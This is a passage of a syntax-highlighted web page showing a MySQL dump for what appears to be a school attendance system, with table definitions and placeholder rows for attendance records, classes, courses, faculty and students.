punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="52"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">COMMENT</span> <span class="token string">'0=absent,1=present,2=late'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="71"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="72"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="73"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">level</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="74"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">section</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="75"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">status</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token number">1</span> <span class="token constant">COMMENT</span> <span class="token string">'1=Active, 0=Inactive'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="76"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="80"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">level</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">section</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">status</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:48:45'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:52:58'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="91"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="94"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="95"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="96"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="97"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="98"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_ids</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="99"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="103"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_ids</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'0000-00-00 00:00:00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="108"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'0000-00-00 00:00:00'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre></pre></td></tr><tr><td data-num="110"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="111"></td><td><pre></pre></td></tr><tr><td data-num="112"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="114"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="115"></td><td><pre></pre></td></tr><tr><td data-num="116"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="117"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="118"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="119"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="120"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="122"></td><td><pre></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="128"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Sample Course'</span><span class="token punctuation">,</span> <span class="token string">'Sample Course'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:00:41'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Course 2'</span><span class="token punctuation">,</span> <span class="token string">' Course 2'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:09'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="130"></td><td><pre><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Course 3'</span><span class="token punctuation">,</span> <span class="token string">' Course 3'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:16'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="131"></td><td><pre><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Course 4'</span><span class="token punctuation">,</span> <span class="token string">' Course 4'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:02:24'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="132"></td><td><pre></pre></td></tr><tr><td data-num="133"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="134"></td><td><pre></pre></td></tr><tr><td data-num="135"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="136"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="137"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="138"></td><td><pre></pre></td></tr><tr><td data-num="139"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="140"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="141"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="142"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="143"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="144"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="145"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">address</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="146"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre></pre></td></tr><tr><td data-num="149"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="150"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="151"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="152"></td><td><pre></pre></td></tr><tr><td data-num="153"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">address</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="154"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'06232014'</span><span class="token punctuation">,</span> <span class="token string">'John Smith'</span><span class="token punctuation">,</span> <span class="token string">'jsmith@sample.com'</span><span class="token punctuation">,</span> <span class="token string">'+18456-5455-55'</span><span class="token punctuation">,</span> <span class="token string">'Sample Only'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 11:32:18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="157"></td><td><pre></pre></td></tr><tr><td data-num="158"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="159"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="160"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="161"></td><td><pre></pre></td></tr><tr><td data-num="162"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="163"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="164"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="165"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token 